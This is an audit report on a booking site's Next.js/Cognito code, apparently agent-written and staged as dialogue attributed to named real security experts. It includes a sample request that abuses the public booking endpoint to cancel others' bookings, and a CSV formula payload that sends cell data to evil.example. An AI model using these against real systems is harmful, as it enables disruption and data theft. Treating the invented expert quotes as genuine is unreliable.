# RMASA Website — Expert Security Panel Audit (October 2026)

> A roundtable review of the Royal MAS Arena booking site by Bruce Schneier, Troy Hunt,
> James Kettle, Parisa Tabriz and Simon Willison. It covers the code on `main` at
> `4c1ab79` (22 Oct 2026). Every finding points to a file and line in this repo.
>
> **Scope:** NextAuth + Cognito hybrid auth, admin route guards, the anonymous public
> booking and contact endpoints, the priority-override cascade, the payment ledger,
> transactional email (Resend), the cron endpoint, CSP and third-party scripts,
> Amplify secrets handling and dependencies.
>
> **Not in scope (does not exist in this app):** file uploads, LLM / AI pipelines,
> Stripe, OAuth integrations other than Cognito, Supabase/RLS. The audit template
> names these, but RMASA has none of them. Parts 4–6 are reframed to cover what the
> app *does* have.
>
> **Method:** static review of every route under `src/app/api/`, the auth and store
> libraries, admin server components, `next.config.ts`, `amplify.yml`, the GitHub
> workflow, a git-history secret scan, and `npm audit --omit=dev`. No requests were
> sent to production.

---

## Remediation log (October 2026)

All ten quick wins are done on branch `claude/rmasa-security-audit-a5c50d`, except #10 (MFA), which is an AWS console change.

| Finding | Status |
|---|---|
| F1 — anonymous override cascade | **Fixed.** The public POST passes `[]` to `insertBookingWithCascade` and sends no override emails. The cascade runs only on admin confirm. `scripts/restore-overridden-slots.mjs` reports and restores slots orphaned before the fix (dry run by default). |
| F22 — *new, found while fixing F1:* client-sent `slotStatus` / `rejectReason` were written straight to `BookingSlot`, so an anonymous request could submit its own slots as `confirmed` (mass assignment) | **Fixed.** `normalizePublicSlots()` rebuilds slots from `date` + `startTime` only. |
| F2 — client-controlled end time; past dates | **Fixed.** `endTime = startTime + durationMinutes` on the server; slots before today (Colombo) are rejected. |
| F3 — unbounded slot count | **Fixed.** At most 50 base slots and 400 after recurrence. |
| F4 — admin text in public responses | **Fixed.** `week-snapshot` omits `rejectReason` and sends block reasons as `"Unavailable"`. 409 reasons go through `toPublicConflictReason()`. *Visible change:* public calendar blocks now read "Unavailable" instead of the admin's note. |
| F6 — Turnstile fail-open | **Fixed.** It fails closed in production and checks `hostname` against `NEXTAUTH_URL`'s host (plus www/apex twin and the optional `TURNSTILE_ALLOWED_HOSTNAMES`). |
| F7 — admin pages trust the JWT | **Fixed.** `requireAdminPage()` (DB re-check) is used in the admin layout and hub page. The login page auto-forwards only active admins. |
| F8 — CSV formula injection | **Fixed.** `csvCell()` / `csvRow()` in `src/lib/csv.ts` are used by the reports and revenue exports. |
| F10 — Clarity on admin | **Fixed.** `ClarityAnalytics` skips `/admin/*`, stops and resumes on client-side navigation, and the admin section carries `data-clarity-mask`. |
| F16 — `sharp` advisory, no Dependabot | **Fixed.** `sharp` 0.35.5 via `npm audit fix` (prod audit now 0); `.github/dependabot.yml` added. A dev-only `braces` advisory in `eslint-config-next` remains; its only fix is a breaking downgrade. |
| F17 — cron logs on public repo | **Fixed.** The workflow prints the HTTP status only. |
| F5 — payment-ledger lost update; no amount cap | **Fixed** (follow-up branch). `SELECT … FOR UPDATE` on the booking row inside the payment transaction; `parsePaymentAmount()` caps entries at LKR 100M. |
| F9 — acknowledgement email relay | **Fixed** (follow-up). The contact acknowledgement no longer echoes the name, phone or message; contact/booking acknowledgements are capped at 3/10 per address per 24 h. |
| F11 — `cognitoSub` never compared | **Fixed** (follow-up). A stored sub must match; a mismatch is refused and audit-logged. |
| F13 / May #10 — contact webhook never fired in prod | **Fixed** (follow-up). `_AMPLIFY_CONTACT_WEBHOOK_URL` added to `next.config.ts`. |
| F15 — per-slot approve skips conflict check; raw Prisma errors | **Fixed** (follow-up). Batch and single-slot saves run the same conflict scan as Confirm All (409 on conflict, or when confirming over a lower-priority booking); errors are generic. |
| F18 — last-super-admin race; unvalidated `role` | **Fixed** (follow-up). `parseAccountUpdate()` validation; check plus update in one SERIALIZABLE transaction. |
| F19 — reference collision returns 500 | **Fixed** (follow-up). Insert retried with a fresh reference on P2002, up to 5 attempts. |
| F21 (timeout part) — contact webhook has no timeout | **Fixed** (follow-up). 5 s `AbortSignal.timeout`. HMAC signing is still open. |
| F12 — MFA | **Open.** Enable TOTP MFA in the Cognito user pool (AWS console). |

Tests: `public-booking-rules.test.ts`, `turnstile.test.ts`, `csv.test.ts`, `clarity-scope.test.ts`; follow-up adds `payments.test.ts` cases, `acknowledgement-caps.test.ts`, `cognito-sub.test.ts`, `account-update.test.ts`, `slot-activation.test.ts`, `contact-webhook.test.ts`, `unique-retry.test.ts`.

---

## Status of the May 2026 audit

| # (May) | Finding | Status today |
|---|---|---|
| 1 | Unescaped HTML in emails | **Fixed.** Every user/admin interpolation in `src/lib/email.ts` goes through `esc()`. Slot dates and times are not escaped, but they are regex-validated upstream. |
| 2 | JWT role/active staleness in API routes | **Fixed for API routes.** It is **not** fixed for admin *server components*. See new finding F7. |
| 3 | `updateCalendarDb` race | **Fixed** (helper removed). |
| 4 | Public booking spam | **Partly fixed.** Turnstile and length caps are in place. There is still no per-IP rate limit, and Turnstile fails open (F6). |
| 5 | Waiver math | **Fixed** (`src/lib/payments.ts` plus tests). |
| 6 | No CSP | **Fixed**, but `script-src 'unsafe-inline'` remains (F14). |
| 7 | MFA off | **Still open** (deferred until the domain exists). |
| 8 | Contact webhook unsigned, no timeout | **Still open.** |
| 9 | 24-bit booking reference, no retry | **Still open.** `reference` is `@unique`, so a collision returns a 500. |
| 10 | `CONTACT_WEBHOOK_URL` not baked for Amplify | **Still open.** The route now reads `_AMPLIFY_CONTACT_WEBHOOK_URL`, but `next.config.ts` never defines it, so the fallback is always `undefined`. |
| 11 | Logout endpoint cached per Lambda | Still open (Low). |
| 13 | `EmailLog.htmlBody` kept with no retention limit | Still open. |
| 17 | No `Origin` check on admin mutations | Still open (Low). |
| 19 | No Dependabot/Renovate | **Still open.** `.github/` contains only the cron workflow, and `npm audit` now reports a high-severity issue (F16). |

---

## Opening — first impressions

**Schneier:** I want to start with incentives, not code. Who wants to attack a sports-arena booking site? Not nation states. Think of a club that lost the Saturday slot to a rival, a disgruntled customer, a competitor venue, or a bored teenager. None of them need to steal data. They want to **disrupt bookings** or **get the hall cheaply**. So the important question is not "can they read the database?" It is "can an anonymous person change someone else's booking, or the price?" I'm afraid the answer to both is yes.

**Hunt:** The basics are in good shape. `requireAdmin()` re-reads the user row on every API call. Emails are escaped. Input lengths are capped. There are no secrets in git history; I scanned every commit for Resend keys, Neon URLs and AWS keys. The old `data/calendar-db.json` only ever held `123@test.com` test data. That is better than most small-business sites I see. The weak spots are business logic, not OWASP-scanner material.

**Kettle:** I agree. I spent most of my time on `POST /api/calendar/bookings`. It is anonymous. It trusts the client for the slot *end* time. And it runs a cascade that mutates other customers' bookings before any human reviews anything. That is the centre of this audit.

**Tabriz:** I'll take the platform side: Clarity is recording the admin panel, Turnstile fails open, admin server components skip the DB re-check, and the CSP is weaker than it looks. Plus a dependency advisory nobody would have noticed, because nothing is watching.

**Willison:** There's no LLM in this codebase, so I'll do what I'd do anyway: follow untrusted strings to the places they end up. Customer-typed text reaches admin spreadsheets, third-party session recordings, public JSON and victims' inboxes. Those are the trust boundaries that matter here.

---

## Part 1 — Authentication & session management

**Hunt:** The flow is solid. Cognito holds credentials and lockout. The `signIn` callback in `src/lib/auth.ts:39-82` rejects emails that are missing from Postgres or marked inactive. The `next` param on `/admin/login` is restricted with `startsWith("/admin")` (`src/app/admin/login/page.tsx:14`), and NextAuth's default `redirect` callback limits `callbackUrl` to the same origin. So there's no open redirect.

**Schneier:** Two policy gaps. First, MFA is off, and has been for five months, waiting on a domain. Cognito supports TOTP authenticator apps, which need no SES and no domain. Email MFA is blocked. TOTP never was. Second, the session lifetime: `maxAge: 4h` with `updateAge: 15min` (`auth.ts:6-12`) gives a sliding session. A stolen cookie on a shared front-desk PC stays alive as long as somebody keeps using it.

**Kettle:** `cognitoSub` is trust-on-first-use (`auth.ts:68-74`). It's written once and **never compared afterwards**. If someone recreates a Cognito user with the same email in the pool, they inherit the Postgres admin row. The code accepts that silently. It should compare `profile.sub` with the stored `cognitoSub` when one exists and refuse on a mismatch.

**Tabriz:** `GET /api/auth/federated-logout` is a GET with side effects. A cross-site `<img>` can log an admin out of Cognito. It's annoying rather than dangerous, so Low.

---

## Part 2 — Authorisation & admin isolation

**Hunt:** Every API route under `src/app/api/admin/` calls `requireAdmin()` or `requireSuperAdmin()` before doing anything. I checked all nine. Accounts management and `PUT /config` are super-admin only. Good.

**Tabriz:** But the **pages** don't use those guards. `src/app/admin/calendar/layout.tsx:11-15` and the hub at `src/app/admin/calendar/page.tsx:25-30` only call `getServerSession()`, which trusts the JWT. The hub then runs Prisma queries directly. It renders KPIs, revenue and the recent-activity table, which joins audit-log rows to customer names. The `revenue` and `schedule` pages work the same way. So the May fix ("deactivation takes effect on the next request") holds for `fetch('/api/...')` but **not** for server-rendered pages. A deactivated admin keeps read access to the hub for up to 4 hours. Because of the sliding session, it's open-ended if they keep refreshing.

**Schneier:** That's precisely the case the deactivate button exists for: a staff member who leaves on bad terms. They're the person most likely to keep a tab open.

**Kettle:** The layout also derives `isSuperAdmin` from the JWT role (`layout.tsx:17`). The APIs still enforce correctly, so a demoted super-admin only sees UI they can't use. That's cosmetic. The fix for both problems is a `requireAdminPage()` helper that runs `loadActiveAdmin()` and redirects. Call it from the layout, and the layout covers every child page.

**Hunt:** One more in `PATCH /api/admin/accounts/[id]` (`route.ts:59-65`): `payload.role` goes to Prisma unvalidated. `"role":"owner"` becomes a Prisma enum error, which is a 500, not a 400. That isn't exploitable. But the "last active super admin" check (`:43-57`) is a read-then-write with no transaction. Two super-admins demoting each other at the same moment could leave zero. That is an unlikely race with a nasty result, and `SERIALIZABLE` or a conditional update fixes it.

---

## Part 3 — API security: the public booking endpoint

This is where the serious findings are.

### F1 — An anonymous customer can cancel other people's confirmed bookings (Critical)

**Kettle:** Look at the order of operations in `src/app/api/calendar/bookings/route.ts`:

1. Line 413: `evaluateBookingConflicts(conflictDb, booking)`. For every existing booking whose event type has a **lower priority** than the candidate's, the overlap is recorded as an *override target*, not a conflict (`src/lib/calendar-core.ts:365-376`). Booking status is not checked here; `confirmed` is included.
2. Line 427: `insertBookingWithCascade(...)` sets the overlapping slots of those bookings to `slotStatus = "cancelled_override"` **inside the same transaction that inserts the new `pending` booking** (`src/lib/calendar-store.ts:220-238`).
3. Lines 461-494: each victim is emailed that their slot was cancelled.

All of this happens when an **anonymous, unapproved** request is submitted. The new booking is only `pending`. An admin may reject it a minute later, but nothing restores the victim's slots. I grepped `calendar-store.ts` for any un-cancel path and there isn't one.

**Schneier:** Spell out the attacker's playbook.

**Kettle:** The attacker opens `/bookings`, picks the cheapest event type with a higher priority than Badminton (or whatever the target holds), selects slots over the victim's confirmed sessions, enters a throwaway email, solves Turnstile once, and submits. One request can contain many `selectedSlots` *and* a 26-occurrence weekly recurrence (`assertRecurrenceWindow`, `calendar-core.ts:396-417`). One submit can therefore wipe every lower-priority booking in a room for six months. Every affected customer gets an official "your booking was cancelled" email from the venue.

```http
POST /api/calendar/bookings
{ "roomTypeId": "<main-arena>", "eventTypeId": "<higher-priority type>",
  "acMode": "without_ac",
  "selectedSlots": [{ "date": "2026-11-07", "startTime": "08:00", "endTime": "18:00" }],
  "recurrence": { "frequency": "weekly", "occurrences": 26 },
  "customer": { "name": "x", "email": "throwaway@…", "phone": "0770000000", "purpose": "x" },
  "turnstileToken": "<one valid token>" }
```

**Hunt:** And the public priority notice on `/bookings` tells the attacker exactly which event types win. That is good customer UX, but it is also a map for the attacker.

**Schneier:** This is the core design flaw. The system gives *the power to cancel others* to *an unauthenticated claim* ("I want to book Full Day"). The trust decision ("this booking outranks yours") should be made by the person who already makes trust decisions: the admin who confirms. The admin confirm path already runs the same cascade (`admin/calendar/bookings/route.ts:792-830`), so the fix is mostly deletion.

**Recommendation:** in the public POST, treat override targets as *soft conflicts*. Insert the pending booking **without** cascading, and record the would-be overrides so the admin sees them. Run the cascade only in the admin confirm path. Separately, write a script that lists `cancelled_override` slots whose overriding booking ended up `rejected`, and restore them.

### F2 — The client controls slot end time, so the price can be tampered with (High)

**Kettle:** The handler validates `startTime` and `endTime` as `HH:MM` strings (`route.ts:126-130`). It checks that both are inside working hours and that the start is on the room's cadence grid (`:172-196`). It **never checks that `end − start` equals the event type's `durationMinutes`**, or even that `end > start`. Price comes from `findPrice()` per slot, whatever the slot's length (`:248-260`). So a "1 Hour" booking with `"endTime": "18:00"` books the whole day at the one-hour rate. It also widens the overlap window used for F1.

**Hunt:** An admin reviews pending bookings, so a sharp admin might notice "08:00–18:00, 1 Hour". But the queue shows slot times and the price side by side, and the price looks normal. I wouldn't rely on that.

**Kettle:** Related: there's no check against **past dates**. `assertAdvanceBookingLimit` only bounds the future (`calendar-core.ts:419-435`). Past-dated bookings pollute the revenue cohorts, which are keyed on `createdAt`, and the conflict data.

**Recommendation:** derive `endTime` on the server as `startTime + eventType.durationMinutes` and ignore the client's value. Reject `date < todayInColombo()`.

### F3 — Request size is unbounded, so slot expansion costs CPU and DB (Medium)

**Kettle:** `selectedSlots` has no length cap (`route.ts:92`). It's multiplied by up to 26 by `expandRecurrence`, then put through `findInternalSlotConflicts`, which is **O(n²)** (`calendar-core.ts:444-465`). Then `bookingSlot.createMany` writes n rows. A few thousand base slots per request means millions of comparisons and thousands of rows in one Lambda. Turnstile limits this to one token per request, but one request is enough.

**Recommendation:** cap `selectedSlots.length` (for example at 50) and the expanded total (for example at 200), and return 400 above that.

### F4 — The public snapshot leaks admin-written text (Medium)

**Willison:** `GET /api/calendar/week-snapshot` is anonymous. It returns `slot.rejectReason` for every slot of active bookings (`week-snapshot/route.ts:94-100`) and `block.reason` for every block (`:104-112`). Rejection reasons are admin free text written *to the customer*, like "Unpaid from last month, please call". Block reasons are internal notes, like "Closed for Minister's private event". Anyone can scrape them in 31-day windows. The client needs neither field to compute availability.

**Recommendation:** drop `rejectReason` and `reason` from the response, or replace `reason` with a generic "Unavailable". The 409 conflict body in the booking POST also echoes `Blocked: ${blocked.reason}` and internal booking UUIDs (`calendar-core.ts:338, 379`). Send generic text there too.

### F5 — Payment-ledger lost update (Medium)

**Kettle:** `POST /bookings/[id]/payments` reads `paymentEntries`, inserts one, and recomputes the cached `paidAmountLkr` inside an interactive transaction (`payments/route.ts:55-93`). That transaction runs at Postgres's default READ COMMITTED with no row lock. Two admins posting at the same moment each recompute from a list missing the other's entry, and the last write wins. The ledger stays correct. The cached `paidAmountLkr` and `reconciliationStatus` do not, and the reminder cron trusts them.

**Recommendation:** `SELECT … FOR UPDATE` on the booking row (via `$queryRaw`), or recompute from `paymentEntry.aggregate` after the insert. Also put an upper bound on `amountLkr`; `Number("1e20")` overflows the `Int` column and returns a 500.

### F6 — Turnstile fails open and is not bound to the host (Medium)

**Tabriz:** `src/lib/turnstile.ts:19-21` returns success when `TURNSTILE_SECRET_KEY` is empty. That was intentional for the rollout, but nothing alerts when it happens. A failed Amplify env bake, or a missed `_AMPLIFY_` line, silently removes the only bot control on two anonymous, email-sending endpoints. The verify call also ignores the `hostname` and `action` fields in Cloudflare's response.

**Recommendation:** fail **closed** when `NODE_ENV === "production"` and the secret is missing, and log loudly. Check `data.hostname` against the allowed hosts. A non-destructive way to check production today: send `POST /api/contact` with `{}`. A response of "Bot verification failed" means Turnstile is enforcing. "Please complete all fields" means it is failing open.

### Admin-side API notes

**Kettle:** Three smaller items:

- The **batch slot path** (`admin/calendar/bookings/route.ts:478-500`) can set `slotStatus: "confirmed"` without running `evaluateBookingConflicts`. Only the booking-level confirm (`:792`) checks. An admin can double-book through per-slot approve. That's not an attack, but it is an integrity gap.
- The same path returns raw Prisma error text to the client (`:486-488`).
- `POST /blocks` accepts `endTime <= startTime`, and `reason` has no length limit (`blocks/route.ts:56`). Combined with F4, that unlimited text is served publicly.

---

## Part 4 — Customer-supplied content and where it lands

*(Replaces "File upload". RMASA has no uploads, but it does have anonymous free text that flows into several sinks.)*

### F8 — CSV formula injection in the accounting export (Medium)

**Willison:** `exportCsv()` in `src/app/admin/calendar/reports/page.tsx:68-95` quotes commas and quotes, but it doesn't neutralise leading `=`, `+`, `-`, `@`, tab or CR. A customer named `=HYPERLINK("https://evil.example/?d="&F2,"Click for receipt")`, or a purpose field holding a DDE payload, runs when the accountant opens `rmasa-report.csv` in Excel. The name, email, phone and purpose columns are all attacker-controlled and anonymous.

**Hunt:** This is a classic, and it's exactly the file finance staff open on Windows with Excel. Medium is right. Excel's protected-view prompts are the only thing stopping it.

**Recommendation:** in `escape()`, prefix any cell starting with `[=+\-@\t\r]` with a `'`. The revenue CSV in `admin-revenue.tsx:239-268` only contains admin-configured names. Apply the same helper there anyway.

### F9 — Booking and contact forms send victim-addressed email (Medium)

**Hunt:** `POST /api/contact` sends `sendContactAcknowledgement` to **whatever email is typed in** (`contact/route.ts:84-87`), and echoes the submitted name and message back. The booking POST does the same with `sendBookingAcknowledgement`. Anyone can make the venue's sending identity deliver a 1,000-character message of their choosing to any inbox. "Your booking BK-… — please pay at https://…" from the real Royal MAS Arena sender is a ready-made phishing template. `esc()` stops HTML injection, but plain-text social engineering still works.

**Schneier:** Turnstile makes it slow, but not impossible. A human with a script and a solving service pays cents per message.

**Recommendation:** don't echo the free-text message in the acknowledgement. Say "we received your message" and include the reference only. Add a per-recipient cap (for example, 3 acknowledgements per address per day, enforced from `EmailLog`).

---

## Part 5 — Third-party data flows

*(Replaces "AI pipeline". The data that leaves the trust boundary here goes to Microsoft Clarity, not an LLM.)*

### F10 — Microsoft Clarity records the admin panel, including customer PII (High)

**Willison:** `src/app/layout.tsx:36-44` injects Clarity in the **root** layout, and the admin pages render inside that same root layout (CLAUDE.md says "there is no parallel admin layout"). So every admin session on `/admin/calendar/*` is session-recorded and sent to Microsoft. That includes the bookings detail pane with customer names, emails, phones and purposes, the payment ledger, the reports table and the accounts page. Clarity's default masking hides `<input>` values, but **rendered text is captured**, and the admin pane is almost all rendered text. I grepped for `data-clarity-mask`; there are zero uses.

**Tabriz:** That's a data-processor relationship nobody signed up for, and probably a Sri Lanka PDPA (2022) problem: customer contact data sent to a third-party analytics vendor with no disclosure. It's also a breach multiplier. Whoever gets into the Clarity dashboard can replay the admin panel.

**Hunt:** I'd rate it High. It isn't exploitable in the CVE sense, but it's an ongoing, silent leak of every customer's PII.

**Recommendation:** load Clarity only on public routes. Gate it on `!pathname.startsWith("/admin")` in a small client component, or move the script into a `(public)` route group layout. As a backstop, add `data-clarity-mask="true"` on `.admin-section`. Also review the public bookings page: the receipt panel echoes the customer's name, email and phone as text after they type them.

### Other third parties

**Tabriz:**

- **Resend** still sends from `onboarding@resend.dev` until the domain is verified. Deliverability is poor, and it makes F9's phishing harder to tell apart from real mail.
- **Contact webhook**: still unsigned and has no `AbortSignal.timeout` (`contact/route.ts:94-107`). And because of the missing `next.config.ts` line, it is probably **not firing in production at all** (May #10).
- **Cognito**: fine. The client secret is server-only, and `COGNITO_ISSUER` comes from config, not user input, so the `.well-known` fetch in `federated-logout` is not an SSRF.

---

## Part 6 — Secrets & infrastructure

**Tabriz:** The `_AMPLIFY_*` pattern is clever, and the prebuild leak guard (`scripts/check-amplify-secret-leak.mjs`) is better than most teams have. Two notes:

1. The baked values are **plaintext string literals in the server bundle on disk** in the Lambda artifact and in Amplify's build cache (`.next/cache/**`). Anyone with read access to the Amplify app or its S3 artifacts has every secret: DB URL, NextAuth secret, Cognito secret, Resend key, cron secret. Treat Amplify console access as equivalent to production DB access, and keep that IAM group small. The longer-term fix is AWS Secrets Manager or SSM read at cold start, which `src/instrumentation.ts` is already positioned to do.
2. `instrumentation.ts` copies only 6 of the 12 baked vars into `process.env`. Code that reads `process.env.X` directly, without the fallback, therefore gets `undefined` for the other six in production. That's how `CONTACT_WEBHOOK_URL` (#10) failed. One explicit allowlist in one file would remove this class of bug.

**Kettle:** Cron auth (`cron/unpaid-reminders/route.ts:29-33`) uses `!==` instead of `timingSafeEqual`. Over the network, through CloudFront, the timing signal is negligible. The comment is honest about it. Low.

**Schneier:** Here's one nobody would think of. **The repository is public** (`gh repo view` → `PUBLIC`). `.github/workflows/unpaid-reminders.yml` runs `curl -fsS`, which prints the response body: `bookingsReminded: [{ reference, milestoneDays, … }]`. Actions logs on a public repo are readable by anyone. So the world gets a daily list of which booking references are overdue. It's low impact today, because there's no public lookup by reference, but it's an unforced disclosure. Add `-o /dev/null -w '%{http_code}'`. More broadly, `CLAUDE.md` and `docs/` give an attacker the full architecture, including the priority-override mechanism behind F1. Being public isn't wrong in itself, but it means you can't count on anything staying obscure.

**Tabriz:** Incident readiness: `AuditLog` is good, but `logAuditEvent` swallows all errors (`src/lib/audit.ts:29-31`), so a broken audit write is invisible. Nothing alerts on bursts of `AUTH_LOGIN_FAILED` or on override cascades. Override cascades should at least go to the admin digest, and they already do via `sendAdminSlotOverriddenNotification`. Good. Turn that email into a runbook trigger.

---

## Part 7 — Browser-side & supply chain

**Tabriz:**

- **F14 CSP**: enforcing, with a tight host list. But `script-src 'unsafe-inline'` (`next.config.ts:27`) means an injected inline `<script>` still runs, which cancels most of CSP's value against XSS. Next 15 supports per-request nonces through middleware. The only inline script is the Clarity bootstrap, which can move to an external file under `/public`. That would let you drop `'unsafe-inline'` from `script-src`. Medium.
- **Security headers on static files**: `headers()` doesn't apply to `/public/` assets on Amplify (as CLAUDE.md notes for Cache-Control). Those are images, so the missing CSP doesn't matter. HSTS on the HTML is what counts, and that's present.
- **F16 `sharp` < 0.35.5** (GHSA-wq5f-xc86-pv6w, librsvg). `npm audit --omit=dev` flags it as **high**. In practice it's reachable only if `next/image` optimises an attacker-supplied SVG. There are no `remotePatterns`, so it isn't reachable today. `npm audit fix` is a one-liner, so do it now.
- **No automated dependency monitoring.** Two overrides were added by hand in October. Add Dependabot (`.github/dependabot.yml`, weekly, npm + github-actions).

**Willison:** XSS sinks: I grepped for `dangerouslySetInnerHTML` and `innerHTML` across `src/` and found zero hits. React escaping plus `esc()` in email covers the rest. `EmailLog.htmlBody` is still never rendered. Keep it that way, or render it in a sandboxed `<iframe srcdoc>` with no `allow-scripts`.

---

## Conclusions

**Schneier:** The authentication layer is solid. The problem is that an anonymous form submission is treated as an *instruction* when it should be a *request*. F1 and F2 both come from that: the server lets the anonymous client decide whom to cancel and how long to book. Fix the trust model, and most of the High-severity surface disappears.

**Kettle:** F1 first. It can be exploited today with one Turnstile solve, it damages real customers, and it can't be undone in the UI.

**Hunt:** F10 second. It's a privacy leak happening on every admin page view right now, and it's a ten-line fix.

**Tabriz:** Then make the deactivate button work everywhere (F7), and stop failing open (F6).

**Willison:** And neutralise the CSV export (F8) before the next month-end report. The person most likely to open a weaponised spreadsheet is the accountant.

---

## Prioritised findings

| # | Finding | OWASP | Severity | Effort | Expert(s) |
|---|---|---|---|---|---|
| F1 | Anonymous `POST /api/calendar/bookings` cascades `cancelled_override` onto **confirmed** lower-priority bookings at submit time, before admin review, with no restore on reject. One request with a 26× recurrence can wipe a room for 6 months and email every victim (`bookings/route.ts:413-427`, `calendar-store.ts:220-238`, `calendar-core.ts:365-376`) | A04 Insecure Design / A01 | **Critical** | Medium | Kettle, Schneier, Hunt |
| F22 | *(Found while fixing F1.)* Client-sent `slotStatus` / `rejectReason` in `selectedSlots` were copied into `BookingSlot` by `insertBookingWithCascade`, so an anonymous request could submit its own slots as `confirmed` | A08 / mass assignment | **High** | Low | Kettle |
| F2 | Client-supplied `endTime` is trusted: no `end − start == durationMinutes` check and no `end > start` check, so a whole day can be booked at the 1-hour price. Past dates are also accepted (`bookings/route.ts:126-196`) | A04 | **High** | Low | Kettle |
| F10 | Microsoft Clarity runs on `/admin/*` (root layout `layout.tsx:36-44`) with no masking, so customer names, emails, phones and payments are session-recorded by a third party | A02 / privacy (PDPA) | **High** | Low | Willison, Tabriz, Hunt |
| F7 | Admin server components (`admin/calendar/layout.tsx:11`, `page.tsx:25`, `revenue`, `schedule`) trust the JWT only. Deactivated admins keep read access to PII and revenue for 4 h or more | A01 / A07 | **Medium** | Low | Tabriz, Kettle |
| F8 | CSV formula injection: customer fields are exported unneutralised in `reports/page.tsx:68-95` | A03 Injection | **Medium** | Low | Willison, Hunt |
| F6 | Turnstile fails open when the secret is missing (`turnstile.ts:19-21`), with no alert and no hostname/action check | A05 / A07 | **Medium** | Low | Tabriz |
| F3 | No cap on `selectedSlots`; ×26 expansion plus O(n²) `findInternalSlotConflicts` and an unbounded `createMany` | A04 | **Medium** | Low | Kettle |
| F9 | Contact/booking acknowledgements echo attacker text to any email address, a phishing relay using the venue's identity (`contact/route.ts:84-87`) | A04 | **Medium** | Low | Hunt, Schneier |
| F4 | Public `week-snapshot` returns `slot.rejectReason` and `block.reason` admin free text; the 409 body echoes block reasons and booking UUIDs | A01 / A04 info disclosure | **Medium** | Low | Willison |
| F5 | Payment-entry POST recomputes cached totals without a row lock, so concurrent entries lose updates. `amountLkr` has no upper bound (Int overflow returns 500) | A04 | **Medium** | Low | Kettle |
| F14 | CSP `script-src 'unsafe-inline'` (`next.config.ts:27`) cancels most of the XSS protection | A05 | **Medium** | Medium | Tabriz |
| F11 | `cognitoSub` stored but never compared, so a recreated Cognito user with the same email inherits the admin row (`auth.ts:68-74`) | A07 | **Medium** | Low | Kettle |
| F12 | MFA still off; Cognito TOTP needs no domain or SES | A07 | **Medium** | Low | Schneier, Hunt |
| F13 | Amplify-baked secrets are plaintext in build artifacts and cache; `instrumentation.ts` copies only 6/12, causing silent env bugs (`CONTACT_WEBHOOK_URL` never fires) | A05 | **Medium** | Medium | Tabriz |
| F15 | Batch slot approve sets `confirmed` without a conflict check (`admin/…/bookings/route.ts:478-500`), so admin double-booking is possible; raw Prisma errors are returned | A04 | **Low** | Low | Kettle |
| F16 | `sharp` < 0.35.5 high-severity advisory; no Dependabot | A06 | **Low** (not reachable) | Low | Tabriz |
| F17 | Public repo: the cron workflow prints the response body with overdue booking references to world-readable Actions logs | A09 / info disclosure | **Low** | Low | Schneier |
| F18 | Last-super-admin guard is read-then-write (race); `role` is not validated, so a bad value returns 500 (`accounts/[id]/route.ts:43-65`) | A04 | **Low** | Low | Hunt |
| F19 | 24-bit booking reference with `@unique` and no retry, so a collision returns 500 (carried over from May #9) | — | **Low** | Low | Kettle |
| F20 | `federated-logout` is a state-changing GET (logout CSRF); the endpoint cache never refreshes | A01 | **Low** | Low | Tabriz |
| F21 | Contact webhook unsigned and has no timeout; `EmailLog.htmlBody` PII retained forever; no `Origin` check on admin mutations (carried over) | A08 / privacy | **Low** | Low–Med | Tabriz, Schneier |

**Where the panel disagreed:**

- **F1 severity.** Hunt argued for High, because the admin could notice and the customer could re-book. Kettle and Schneier held Critical: the attack is anonymous, needs one CAPTCHA solve, cancels *confirmed* bookings, sends official cancellation emails to real customers, and has no undo path in the product.
- **F10.** Tabriz rated it Medium, because Clarity's dashboard is behind Microsoft auth. Willison and Hunt rated it High, because it's an ongoing transfer of every customer's PII to an undisclosed processor. High was kept.
- **F2.** Hunt noted that admin review is a partial control. It stays High, because the queue doesn't flag the mismatch.

---

## Quick wins (each under a day)

1. **[F1] Stop cascading on public submit.** In `POST /api/calendar/bookings`, pass `[]` as `overrideTargets` to `insertBookingWithCascade` and skip the override emails. Leave the cascade to the admin confirm path, which already does it. Write a one-off script to restore `cancelled_override` slots whose overriding booking is `rejected`.
2. **[F2] Derive `endTime` on the server:** `fromMinutes(toMinutes(start) + eventType.durationMinutes)`. Reject `date < todayInColombo()`.
3. **[F10] Keep Clarity off `/admin`.** Move the `<Script>` into a client component that returns `null` when `usePathname().startsWith("/admin")`. Add `data-clarity-mask="true"` to `.admin-section`.
4. **[F7] Add `requireAdminPage()`.** It's `getServerSession` plus `loadActiveAdmin`, redirecting when inactive. Call it in `admin/calendar/layout.tsx`, and derive `isSuperAdmin` from the DB role.
5. **[F8] Neutralise formulas in the CSV export:** `/^[=+\-@\t\r]/.test(s) ? "'" + s : s` in both CSV exporters.
6. **[F6] Make Turnstile fail closed in production,** and check `data.hostname`.
7. **[F3] Cap the payload:** `selectedSlots.length ≤ 50` and expanded slots ≤ 200 in the booking POST.
8. **[F4] Strip `rejectReason` and `reason`** from the `week-snapshot` response and from the public 409 conflict messages.
9. **[F16/F17] Hygiene:** run `npm audit fix` (sharp), add `.github/dependabot.yml`, and change the cron curl to `-o /dev/null -w '%{http_code}\n'`.
10. **[F12] Turn on Cognito TOTP MFA** (optional at first, then required for `super_admin`). It doesn't need the domain.
